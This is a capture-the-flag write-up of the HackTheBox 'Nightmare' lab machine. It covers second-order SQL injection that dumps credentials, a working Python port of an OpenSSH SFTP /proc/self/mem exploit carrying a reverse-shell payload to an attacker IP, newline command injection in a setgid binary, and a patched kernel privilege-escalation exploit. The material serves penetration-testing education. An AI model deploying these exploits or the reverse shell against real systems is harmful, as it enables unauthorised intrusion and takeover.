---
layout: post
title:  "HackTheBox - Nightmare"
date:   2018-07-25 01:00:00 +0100
categories: [htb]
description: ""
image:
  feature: nightmare.jpg
  credit:
---

This machine was a worthy successor to Calamity.  Whilst it didn't test you to the same level with exploit development, it does require the tester to read what their exploits are doing, modify them for custom environments and understand the process at all steps.  This is an invaluable skill that I'm glad the harder boxes test, as downloading an running an exploit is much less fun than understanding what it's doing.

This one's going to be very long so check the Chapters if you're interested in a particular step.

**Chapters**:
- [Enumeration](#enumeration)
	* [SQL Injection](#sql-injection)
	* [**Bonus**: SQLMap](#bonus-sqlmap)
- [SFTP Exploit](#sftp-exploit)
	* [/proc/self/mem Overwrite](#procselfmem-overwrite)
	* [Modifying to 32-bit](#modifying-to-32-bit)
	* [**Bonus**: Python Port](#bonus-python-port)
- [Decoder Privilege Escalation](#decoder-privilege-escalation)
	* [Binary Analysis with radare2](#binary-analysis-with-radare2)
- [Root Privilege Escalation](#root-privilege-escalation)

**Topics Covered**:
* [Second-Order SQL Injection](https://portswigger.net/kb/issues/00100210_sql-injection-second-order)
	* [Exploiting Difficult SQL Injections](http://www.thegreycorner.com/2017/01/exploiting-difficult-sql-injection.html)
* /proc/self/mem based attacks (e.g. [mempodipper](https://git.zx2c4.com/CVE-2012-0056/about/))
* [Radare2 Binary Analysis](https://www.gitbook.com/book/radare/radare2book/details)
* [Command Injection](https://github.com/ewilded/shelling)

Enumeration
----------------
An nmap scan of the device reveals two open ports:

``` 
PORT     STATE SERVICE VERSION 
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu)) 
|_http-server-header: Apache/2.4.18 (Ubuntu) 
|_http-title: NOTES 
2222/tcp open  ssh     (protocol 2.0) 
| fingerprint-strings:  
|   NULL:  
|_    SSH-2.0-OpenSSH 32bit (not so recent ver) 
| ssh-hostkey:  
|   1024 e2:71:84:5d:ed:07:89:98:68:8b:6e:78:da:84:4c:b5 (DSA) 
|   2048 bd:1c:11:9a:5b:15:d2:f6:28:76:c3:40:7c:80:6d:ec (RSA) 
|_  256 bf:e8:25:bf:ca:92:55:bc:ca:a4:96:c7:43:d0:51:73 (ECDSA) 
``` 
Firstly, an HTTP Server running a fairly recent version of Apache, and on port 2222 we see an SSH client running.  There's no version information given however, so we can't confirm anything about what's running or ways to attack it.  All we see is the vesion string `(not so recent ver)`.  This isn't an nmap result, it's the actual version string, and it can be confirmed by connecting directly to the port.

Visiting the web page we're greeted by a login screen.

![](https://image.ibb.co/my9fDm/1.png)

A quick pass with some common SQL injection commands and run with SQLMAP yields nothing, and the same is found with the register page.

![](https://image.ibb.co/ciNdzR/2.png)

However, if we then login with a registered user testing an sql injection, such as a single quotation mark `'`, we're greeted by an SQL error.  

![](https://image.ibb.co/k0aFeR/3.png)

So rather than a standard SQL injection, we have what's known as a second-order SQL injection.  This is an SQL injection where the actual injection ocurrs on a different page to the one where the query is inserted.  Effectively, the notes application is vulnerable to an SQL injection by a username, so we have to register a user, login and then visit the notes page.

### SQL Injection

Using an injection of the form `') OR 1=1 LIMIT 1 #` results in us returning the notes of the admin user: 

![](https://image.ibb.co/doGctm/4.png)

If you're wondering why we do the `LIMIT 0,1` at the end, it's because traditionally these login forms expect only a single user, whilst a `' OR 1=1` injection will return every user.  The `LIMIT` statement at the end effectively trims the results down to a single user.

Since registering and logging in is quite tedious, I wrote a short script to allow myself to easily query the database:

```python 
from requests import Session 
import BeautifulSoup  

def register(s, user, passw): 
    s.post("http://10.10.10.66/register.php", data={"user":user, "pass":passw, "register":"Register"}) 

def login(s, user, passw): 
    x = s.post("http://10.10.10.66/index.php", data={"user":user, "pass":passw, "login":"Login"}) 
    soup = BeautifulSoup.BeautifulSoup(x.text) 
    print soup.findAll("div", attrs={'class':'notes'}) 

while True: 
    sess = Session() 
    username = raw_input("Username:") 
    register(sess, username, username) 
    login(sess, username, username) 
``` 
Using this we first query the table names and databases.  Here I will show the injection followed by it's result:
``` 
') UNION SELECT table_name, table_schema FROM information_schema.columns # 
[u'notes', u'notes'] 
[u'users', u'notes'] 
[u'configs', u'sysadmin'] 
[u'users', u'sysadmin'] 
``` 
We then query the names of the individual columns for each table:
``` 
') UNION SELECT table_name, column_name FROM information_schema.columns # 
[u'notes', u'id'] 
[u'notes', u'user'] 
[u'notes', u'title'] 
[u'notes', u'text'] 
[u'users', u'id'] 
[u'users', u'username'] 
[u'users', u'password'] 
[u'configs', u'server'] 
[u'configs', u'ip'] 
``` 

We see a username and password column in the users table above.  So, let's use this information to dump all the user's of the notes app from the database: 

``` 
Username:') UNION SELECT username, password from sysadmin.users # 
[u'admin', u'nimda']
[u'cisco', u'cisco123'] 
[u'adminstrator', u'Pyuhs738?183*hjO!'] 
[u'josh', u'tontochilegge'] 
[u'system', u'manager'] 
[u'root', u'HasdruBal78'] 
[u'decoder', u'HackerNumberOne!'] 
[u'ftpuser', u'@whereyougo?'] 
[u'sys', u'change_on_install'] 
[u'superuser', u'passw0rd'] 
[u'user', u'odiolafeta'] 
``` 

### Bonus: SQLMap
Stephen Bradshaw wrote a great post called [Exploiting Difficult SQL Injection Vulnerabilities with sqlmap](http://www.thegreycorner.com/2017/01/exploiting-difficult-sql-injection.html), and has a small section devoted to SQLMap based injections of this type.  Of course, it's difficult to exploit a vulnerability of this type due to cookie based authentication, and the app not automatically logging us in.  

We can however simulate the full action we want using a flask forwarding server.  It's not ideal but it does simulate the actions we want quite well.  Of course the injection itself is simple enough that I'd consider this overkill, but it's always good to learn:

```py
from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/', methods=['POST'])
def register_nightmare():
    user, passw = request.form['user'], request.form['pass']
    register = requests.post('http://10.10.10.66/register.php', data = {'user': user, 'pass': passw, 'register': 'Register'})
    login = requests.post('http://10.10.10.66/index.php', data = {'user': user, 'pass':passw, 'login': 'Login'})
    return login.text

if __name__ == '__main__':
    app.run()
```
We can then just apply sqlmap to our local app and dump the database in that manner:
```
root@kali:~/# sqlmap -u http://localhost:5000/ --method=POST --data="user=&pass=booj123" -p user --dump-all
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.1.11#stable}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 12:51:58

[12:51:58] [WARNING] provided value for parameter 'user' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly
[12:51:58] [INFO] resuming back-end DBMS 'mysql' 
[12:51:58] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: user (POST)
    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: user=') UNION ALL SELECT NULL,CONCAT(CONCAT('qpxzq','zPQQWvLgCFrVTpHZzmIwYAFyAUyeAKDzSvayGudn'),'qxjxq')-- pnMv&pass=booj123
---
[12:51:59] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL n 
```
SFTP Exploit
------------
Testing each of these credentials on port 2222's SSH reveals only `ftpuser` can authenticate, but we're greeted with a strange error:

![](https://image.ibb.co/iV5sR6/5.png)

In all likelihood this means the user is locked down and only able to use the SFTP service on this port.  The username itself gives this away.  A quick test confirms this: 

![](https://image.ibb.co/jqDCR6/6.png)

The fact that we know it's an older SSH version (from the nmap scan) gives us a hint that maybe there's an open issue for this version of SFTP/OpenSSH.  In fact the first result in a google search is [openssh-sftp-sploit](https://github.com/0x90/openssh-sftp-sploit) for 64-bit machines.  Enumerating the system itself reveals itself to be a 64-bit Operating System, by downloading and examining `/sbin/init`.
```
file init 

init: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=4494b297e99a26caca922c24ab505a02460ef88a, stripped 
```
However, the version of SFTP running is 32-bit as confirmed by a quick look at `/proc/self/maps`, or by downloading the binary itself and examining that.  The binary itself in this case will not be in the regular `/usr/sbin` directory but in `/usr/local2`, which is confirmed by looking for any sshd.conf files.
```
Remote working directory: /usr/local2/sbin
sftp> get sshd
Fetching /usr/local2/sbin/sshd to sshd
/usr/local2/sbin/sshd                         100%  852KB 931.4KB/s   00:00 
------------------------------------------------------
root@kali:~# file sshd
sshd: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=6a85d29cb6a982a3e1f031b3f4644b018c63c599, stripped
```

Since there's no 32-bit proof-of-concept available, we'll have to either modify the above exploit or create our own.

### /proc/self/mem Overwrite

In Linux machines, all information relating to processes is stored within the /proc/ folder.  Within this are a number of folders named after the associated process pid's and within these we'll find such as `cmdline`, which contains the command that originally started the process and `maps` which shows the virtual memory addresses of the stack, heap and assorted libraries.  Importantly in this case, it also contains the `mem` file which represents the virtual memory of the process itself.  

If we control `mem` we directly control the memory and therefore execution.  This exploit works by opening the file and writing at the stack head a string to execute.  At the stack tail it writes a rop chain to call system with the start of the stack as the input string.  Between the head and the tail it then writes in a sequence of `ret` instructions until the EIP register is overwritten.  At this point, execution will follow our `ret` chain until it hits our ROP chain at the stack tail.  You've probably used [CVE-2012-0056](https://git.zx2c4.com/CVE-2012-0056/about/), also known as mempodipper, at some point in any number of boot2roots.  This works on the same principle.

So, let's port our exploit!

### Modifying to 32-bit
The calling conventions between 32-bit and 64-bit are slightly different.  Function arguments are passed in via registers in 64-bit, whilst in 32-bit they are passed in via the stack.  

Here the function being called is `system(stack_start_address)`.  In this case we simply go from `pop rdi; ret-> stack_start_addr -> system@libc` to `system@libc -> pop rdi; ret -> stack_start_addr` to achieve similar execution.  Our `pop rdi; ret` will probably cause a segfault in 32-bit once we exit but it doesn't matter too much. 

We also need to adjust the types the exploit is using.  In this case we change all references to `long long` into `int`.  On 64-bit Windows `long` refers to a 32-bit length integer but in Linux it refers to a 64-bit integer, so we have to use `int`.  The references to `Lx` in all the `scanf` and `printf` functions also have to be adjusted to `x` as the variable's types that we're reading into and printing from have changed.

Here's the diff of the changes that need to be made to the C code:
```bash
root@kali:~/nightmare# diff sshsploit.c sshsploit-32.c 
2c2
< OpenSSH <=6.6 SFTP misconfiguration exploit for 64bit Linux
---
> OpenSSH <=6.6 SFTP misconfiguration exploit for 32bit Linux
126c126
<   long long start_addr, end_addr, offset;
---
>   int start_addr, end_addr, offset;
128c128
<   long long stack_start_addr = 0, stack_end_addr;
---
>   int stack_start_addr = 0, stack_end_addr;
133c133
<       if (sscanf(p, "%Lx-%Lx %*4c %Lx", &start_addr, &end_addr, &offset) != 3) perror("scanf failed"), exit(1);
---
>       if (sscanf(p, "%x-%x %*4c %x", &start_addr, &end_addr, &offset) != 3) perror("scanf failed"), exit(1);
140c140
<       if (sscanf(p, "%Lx-%Lx ", &stack_start_addr, &stack_end_addr) != 2) perror("scanf failed"), exit(1);
---
>       if (sscanf(p, "%x-%x ", &stack_start_addr, &stack_end_addr) != 2) perror("scanf failed"), exit(1);
146c146
<   printf("offset %Lx from libc is mapped to %Lx-%Lx\n", offset, start_addr, end_addr);
---
>   printf("offset %x from libc is mapped to %x-%x\n", offset, start_addr, end_addr);
156,159c156,159
<   long long system_offset;
<   if (sscanf(system_offset_str, "%Lx", &system_offset) != 1) perror("scanf failed"), exit(1);
<   long long remote_system_addr = start_addr+system_offset-offset;
<   printf("remote system() function is at %Lx\n", remote_system_addr);
---
>   int system_offset;
>   if (sscanf(system_offset_str, "%x", &system_offset) != 1) perror("scanf failed"), exit(1);
>   int remote_system_addr = start_addr+system_offset-offset;
>   printf("remote system() function is at %x\n", remote_system_addr);
164,166c164,166
<   long long gadget_address = start_addr + (gadget-(libc+offset));
<   long long ret_address = gadget_address+1;
<   printf("found gadget at %Lx\n", gadget_address);
---
>   int gadget_address = start_addr + (gadget-(libc+offset));
>   int ret_address = gadget_address+1;
>   printf("found gadget at %x\n", gadget_address);
168c168
<   printf("remote stack is at %Lx-%Lx\n", stack_start_addr, stack_end_addr);
---
>   printf("remote stack is at %x-%x\n", stack_start_addr, stack_end_addr);
171c171
<   long long stack_len = stack_end_addr - stack_start_addr;
---
>   int stack_len = stack_end_addr - stack_start_addr;
179c179
<   for (long long *s = (void*)new_stack; s<(long long*)(new_stack+stack_len); s++) {
---
>   for (int *s = (void*)new_stack; s<(int*)(new_stack+stack_len); s++) {
188,191c188,191
<   long long *se = (void*)(new_stack + stack_len);
<   se[-3] = gadget_address;
<   se[-2] = stack_start_addr;
<   se[-1] = remote_system_addr;
---
>   int *se = (void*)(new_stack + stack_len);
>   se[-2] = gadget_address;
>   se[-1] = stack_start_addr;
>   se[-3] = remote_system_addr;
198c198
<   rc = sftp_seek64(mem, stack_start_addr);
---
>   rc = sftp_seek(mem, stack_start_addr);
205c205
<     rc = sftp_seek64(mem, stack_start_addr+off);
---
>     rc = sftp_seek(mem, stack_start_addr+off);
212c212
< }
\ No newline at end of file
---
> }
```
The full exploit can be found on [my gist](https://gist.github.com/Reboare/1b6c43a819f840fbc40e613dac0080cd)!

As you can see it's mostly just changing references of `long long` to `int` and changing format strings.  We also change the calling conventions and any 64 bit functions to their 32-bit equivalents.

As a test, run it on a local VM too, to ensure you're running it correctly.  I found it was best to insert a break in the sshsploit script, right before the payload is launched if I needed to debug.  This can be achieved with a simple inline `getchar();`.  Then find the process ID on your remote VM and attach a GDB instance to it. The command for this is `attach PID`. 

### Bonus: Python Port

![](https://imgs.xkcd.com/comics/real_programmers.png)

If you want to test it on a machine you own and have permission to attack, all you need to modify are the parameters at the head of the file.
```python
"""
A Python port of https://github.com/0x90/openssh-sftp-sploit
Tested on:
    OpenSSH 6.5 x86
    OpenSSH 6.5 x64
Written by Booj (@reboare)
"""

from tempfile import SpooledTemporaryFile
from pwn import *
import paramiko

context.arch = 'amd64' #i386/amd64

# Parameters for login and the payload you want to send

host = "10.10.10.66"
port = 2222
username = "ftpuser"
password = "@whereyougo?"


lhost = "10.10.15.174"
lport = 443
payload = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\
s.connect((\"{0}\",{1}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);\
p=subprocess.call([\"/bin/sh\",\"-i\"]);'\x00".format(lhost, lport)

try:
    transport = paramiko.Transport((host,port))
    transport.connect(username=username, password=password)
    sftp = paramiko.SFTPClient.from_transport(transport)
    log.success("Connected!")
    
    p = log.progress("Fetching /proc/self/maps")
    maps = sftp.get('/proc/self/maps', '/tmp/maps')
    p.success('Downloaded /proc/self/maps!')

    with open('/tmp/maps') as maps:
        maps = maps.read()

    log.debug(maps)
    for line in maps.split('\n'):
        if 'r-xp' in line and '/libc-' in line:
            # Get libc information
            _libc_split = line.split(' ')
            _libc_range, libc_path = _libc_split[0], _libc_split[-1]
            libc_start, libc_end = _libc_range.split('-')
            libc_start, libc_end = int(libc_start,16), int(libc_end,16)
            log.debug("libc range is:{0}".format(_libc_range))
            log.info("libc addresses are: {0}-{1}".format(hex(libc_start), hex(libc_end)))
        elif '[stack]' in line:
            stack_start, stack_end = line.split(' ')[0].split('-')
            stack_start, stack_end = int(stack_start, 16), int(stack_end, 16)
            stack_length = stack_end-stack_start
            log.debug("stack length is {0}".format(stack_length))
            log.info("stack addresses are {0}-{1}".format(hex(stack_start), hex(stack_end)))


    p = log.progress("Fetching {0} into /tmp/libc".format(libc_path))
    libc = sftp.get(libc_path, '/tmp/libc')
    p.success('Downloaded {0}!'.format(libc_path))
    libc_elf = ELF('/tmp/libc')

    system_off = libc_elf.symbols[b'system']
    exit_off = libc_elf.symbols[b'exit']

    system = libc_start+system_off
    exit = libc_start+exit_off

    log.info("System offset is at {0}, therefore system address is at {1}".format(hex(system_off), hex(system)))
    log.info("Exit offset is at {0}, therefore exit address is at {1}".format(hex(exit_off), hex(exit)))

    pop_rdi_offset = libc_elf.search('\x5f\xc3').next()
    pop_rdi = libc_start + pop_rdi_offset
    ret_address = pop_rdi + 1
    
    if context.arch == 'i386':
        ropchain = flat(system, exit, stack_start)
    elif context.arch == 'amd64':
        ropchain = flat(pop_rdi, stack_start, system, exit)
    
    new_stack = fit({
            0 : payload,
            (stack_length-len(ropchain)) : ropchain
        },
        filler = pack(ret_address),
        length = stack_length)
    log.success("New Stack Created")
    
    p = log.progress('Writing new stack')
    try:
        with sftp.open('/proc/self/mem', 'w+') as f:
            p.status("Writing payload to 0x{:02x}".format(stack_start))
            f.seek(stack_start, f.SEEK_SET)
            f.write(payload)
        
            p.status("Writing ropchain to 0x{:02x}".format(stack_end-len(ropchain)))
            f.seek(stack_end-len(ropchain), f.SEEK_SET)
            f.write(ropchain)

            p.status("Writing full stack!")
            stack_pointer = stack_length
            while stack_pointer > 0:
                stack_pointer -= 32000
             
                towrite = new_stack[stack_pointer:]
                toseek = stack_start+stack_pointer
            
                f.seek(toseek, f.SEEK_SET)
                f.write(towrite)
            p.failure("Code execution may have failed! Server may not be vulnerable!")
    except paramiko.ssh_exception.SSHException:
        p.success("SSH Connection was forcefully closed!  Check your payload!")

finally:
    sftp.close()
    transport.close()
```
We run this script, set up a listener and are returned a shell as ftpuser. 

 If you're interested in running shellcode as opposed to system binaries to make the exploit more portable, the ret2mprotect rop-chain can be utilised just as easily.  This is left as an exercise for the reader, and an overview of this process can be found in my [Calamity writeup](https://reboare.github.io/hackthebox/calamity.html).  

Decoder Privilege Escalation
------------------
![Never stop not stopping!](https://www.theparisreview.org/blog/wp-content/uploads/2014/01/the-inferno-canto-13.jpg)
We've reached the next level! 

 First thing as always on a new host is to either run an enumeration script or use a guide such as g0tm1lk's.  Within the GUID files we see `/usr/bin/sls` is a guid application which escalates us to the decoder group.  Maybe we can abuse this.
``` 
GUID files: 
-rwxr-sr-x 1 root shadow 35600 Mar 16  2016 /sbin/unix_chkpwd 
-rwxr-sr-x 1 root shadow 35632 Mar 16  2016 /sbin/pam_extrausers_chkpwd 
-rwsr-sr-x 1 daemon daemon 51464 Jan 14  2016 /usr/bin/at 
-rwxr-sr-x 1 root mlocate 39520 Nov 18  2014 /usr/bin/mlocate 
-rwxr-sr-x 1 root shadow 62336 May 17  2017 /usr/bin/chage 
-rwxr-sr-x 1 root decoder 9016 Feb 18  2016 /usr/bin/sls 
-rwxr-sr-x 1 root tty 27368 Apr 13  2016 /usr/bin/wall 
-rwxr-sr-x 1 root utmp 434216 Feb  7  2016 /usr/bin/screen 
-rwxr-sr-x 1 root shadow 22768 May 17  2017 /usr/bin/expiry 
-rwxr-sr-x 1 root ssh 358624 Aug 11  2016 /usr/bin/ssh-agent 
-rwxr-sr-x 1 root tty 14752 Mar  1  2016 /usr/bin/bsd-write 
-rwxr-sr-x 1 root crontab 36080 Apr  5  2016 /usr/bin/crontab 
-rwxr-sr-x 1 root utmp 10232 Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter 
``` 
This actually defeated my CTF instincts quite well and I was quite impressed.  The big difference between a CTF and a real-world system is that in a CTF the dates of applications will hint during enumeration as to where to investigate.  In real-world devices we don't have this luxury.  As you can see `sls` has it's date adjusted to early 2016, so my hat goes off to the box creators for this one.

If you run it you'll see it's at first glance a wrapper around `ls`, returning a simple directory listing. 

Here I've downloaded the sls application to my home pc, and run ltrace on it to view all library calls when inputting a directory.  The ltrace utility is incredibly useful in doing cursory debugging, as it allows you to view any calls to shared libraries.  
```bash
root@kali:/# ltrace /root/Downloads/sls / 
__libc_start_main(0x400766, 2, 0x7fffedda25e8, 0x400980 <unfinished ...> 
malloc(8)                                                                                                                         = 0xf6e010 
strlen("/bin/ls")                                                                                                                 = 7 
strlen("/")                                                                                                                       = 1 
realloc(0xf6e010, 10)                                                                                                             = 0xf6e010 
strcat("/bin/ls ", "/")                                                                                                           = "/bin/ls /" 
strstr(" /", "$(")                                                                                                                = nil 
strchr(" /", '\n')                                                                                                                = nil 
strchr("|`&><'"\\[]{};", ' ')                                                                                                     = nil 
strchr("|`&><'"\\[]{};", '/')                                                                                                     = nil 
system("/bin/ls /"0  bin    boot  dev  etc    home  initrd.img  initrd.img.old  lib  lib32  lib64  libx32  lost+found  media    mnt  opt  proc    root  run  sbin  srv  sys  tmp    usr  var  vmlinuz  vmlinuz.old 
<no return ...> 
--- SIGCHLD (Child exited) --- 
<... system resumed> )                                                                                                            = 0 
free(0xf6e010)                                                                                                                    = <void> 
+++ exited (status 0) +++ 
``` 

We see `strstr` and `strchar` calls which are looking for any reference to `$(`, the newline character, `\n` and the following set of characters ``|`&><'"\\[]{};``.  If it finds a match on any of those, it immediately exits.  

At first I thought, there must be a way of injecting commands.  A blacklist is inherently flawed, but in this instance I had no luck, as it seems like the creators did cover the bases quite well.  As a point of interest for those wondering about this subject, I found [shelling's](https://github.com/ewilded/shelling) documentation to be relatively comprehensive. 

At this point our only option is to open up the application and disassemble it.  There are a lot of branches and loops in this code, so we'll open it in radare2 to quickly identify any code paths that might be vulnerable.

### Binary Analysis with radare2

Here I've used `aaa` to do a full function analysis, followed by `s main` to seek the main function, followed by `V` twice to switch the branch visualization.  I won't be going too in depth into the assembly itself, but merely summarizing the function of each block

The first branch appears to compares the address `local_2ch` with `local_34h`.  This appears to be a check to see if an argument to the function exists, although we'd need to jump into GDB to confirm it directly.

Here we see the result of radare2's graph view:
![](https://image.ibb.co/cWDyio/Untitled_picture.png)
The first branch on an argument exists, the left branch, checks to see if the first character is equal to a `-`, or `0x2d`.  

If this is the case the next block checks the next character and ensures it's equal to `b`.

Next it checks to see if the third character is a space.  So we have a check for a `-b` flag.  If all these match then the address at `local_2fh` is set to 1 and a jump occurs returning to the programs primary logic.

![](https://image.ibb.co/dUQYG8/Untitled_picture.png)

So let's look for that `local_2fh` within the disassembly.
![](https://image.ibb.co/c9UqUT/Untitled_picture.png)
We see a check for it to equal 0 ocurrs.  This occurs after a block which checks for the presence of `0xa` using strchr, which is the character for `\n`.  
![](https://image.ibb.co/nrRyG8/Untitled_picture.png)

The flow of this check can be broken down as follows:

```py
if '\n' in input:
    if local_2fh == 1:
        continue
    else:
        exit
else:
    continue
```

So this implies our input can contain a line feed, as long as the `-b ` flag is set.  So we now have everything we need to achieve command injection.

Now command injection here is simple, but will fail if you don't elevate your shell to a bash tty.  So let's cover our bases and do just that:

```bash
ftpuser@nightmare:/$ /usr/bin/sls -b $'\n/bin/sh'
/usr/bin/sls -b $'\n/bin/sh'
bin   home	      lib32	  media  root  sys  vmlinuz
boot  initrd.img      lib64	  mnt	 run   tmp  vmlinuz.old
dev   initrd.img.old  libx32	  opt	 sbin  usr
etc   lib	      lost+found  proc	 srv   var
$ id
id
uid=1002(ftpuser) gid=1002(ftpuser) egid=1001(decoder) groups=1001(decoder),1002(ftpuser)
```

We now have a way of escalating our groups to decoder.  This isn't the same as full access however, but we can do anything that the decoder group can do.

Root Privilege Escalation
----------------------
Within decoder's home folder we find a folder named test with a group ownership of 'decoder':
```
$ ls -la
ls -la
total 28
drwxr-xr-x  3 root    decoder 4096 Sep 28  2017 .
drwxr-xr-x  3 root    root    4096 Sep 30  2017 ..
-rw-------  1 root    root       0 Sep 13  2017 .bash_history
-rw-r-----  1 decoder decoder  220 Sep  1  2015 .bash_logout
-rw-r-----  1 decoder decoder 3771 Sep  1  2015 .bashrc
-rw-r-----  1 decoder decoder  675 Sep  1  2015 .profile
drwx-wx--x  2 root    decoder 4096 Apr 14 10:58 test
-r--r-----+ 1 decoder decoder   33 Sep 12  2017 user.txt
```
So we can write anything to this folder and we finally have the ability to actually write to the file-system.

Looking at the kernel and version information we see that this is an Ubuntu Machine running kernel 4.8.0-58.  This is vulnerable to [CVE-2017-1000112](https://www.exploit-db.com/exploits/43418/).
```bash
$ uname -a 
Linux nightmare 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
``` 

We'll compile the exploit and transfer it over to the test folder, but we're greeted with an error alerting us that the version was not found.  

This exploit appears to use the codename of the OS to fingerprint the parameters to use.  If we view `lsb_release`, we see that the codename has been changed:

```bash
$ lsb_release -a 
No LSB modules are available. 
Distributor ID:    s390x 
Description:    s390x GNU/Linux
Release:    0.1
Codename:    bladerunner
```
This is a relatively easy fix and it just involves changing a single line in the exploit as below:
``` 
diff cve-2017-1000112.c cve-2017-1000112-nightmare.c  
135c135 
<     { "xenial", "4.8.0-58-generic", 0xa5d20, 0xa6110, 0x17c55, 0xe56f5, 0x119227, 0x1b170, 0x439e7a, 0x162622, 0x7bd23, 0x12c7f7, 0x64210, 0x49fa0 },
---
>     { "bladerunner", "4.8.0-58-generic", 0xa5d20, 0xa6110, 0x17c55, 0xe56f5, 0x119227, 0x1b170, 0x439e7a, 0x162622, 0x7bd23, 0x12c7f7, 0x64210, 0x49fa0 },
``` 

However you may still have issues, especially if you run this in your decoder group elevated shell.  If we look at the contents of /proc/self in both shells we see a key difference!  They're all owned by root in our elevated shell.  If you run the exploit in this shell it will fail as it needs access to those files. 

This appears to be due to http://man7.org/linux/man-pages/man5/proc.5.html .

> Each /proc/[pid] subdirectory contains the pseudo-files  and  directories  described  below.  These files are normally owned by the effective user and effective group ID of the process.  However, as  a security  measure, the ownership is made root:root if the process's "dumpable" attribute is set to  a value other than 1. 


 Of course this isn't a big deal as we can still access the test folder via ftpuser.  Simply use our elevated shell to upload the exploit, and then drop down again to run the exploit.

```bash
$ /home/decoder/test/expl.2
bash: cannot set terminal process group (26896): Inappropriate ioctl for device
bash: no job control in this shell
root@nightmare:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```

